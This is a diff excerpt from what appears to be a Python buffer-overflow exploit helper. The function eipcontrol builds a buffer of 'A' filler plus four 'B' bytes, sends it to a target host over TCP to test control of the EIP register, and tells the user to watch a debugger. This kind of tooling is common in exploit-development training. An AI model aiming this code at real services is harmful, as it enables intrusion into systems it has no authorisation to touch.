@@ -229,9 +229,8 @@ def eipcontrol(host, port, size, cmd):
             s.recv(1024)
             s.close() 
         else:
-            filler = b"A" * size
-            eip = b"B" * 4
-            buffer = filler + eip
+            buffer = b"A" * size
+            buffer += b"B" * 4
             print(f"{Fore.BLUE}\n[*]{Style.RESET_ALL}Sending buffer in attempt to control EIP. Check your debugger{Fore.BLUE}[*]")
             s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(10)
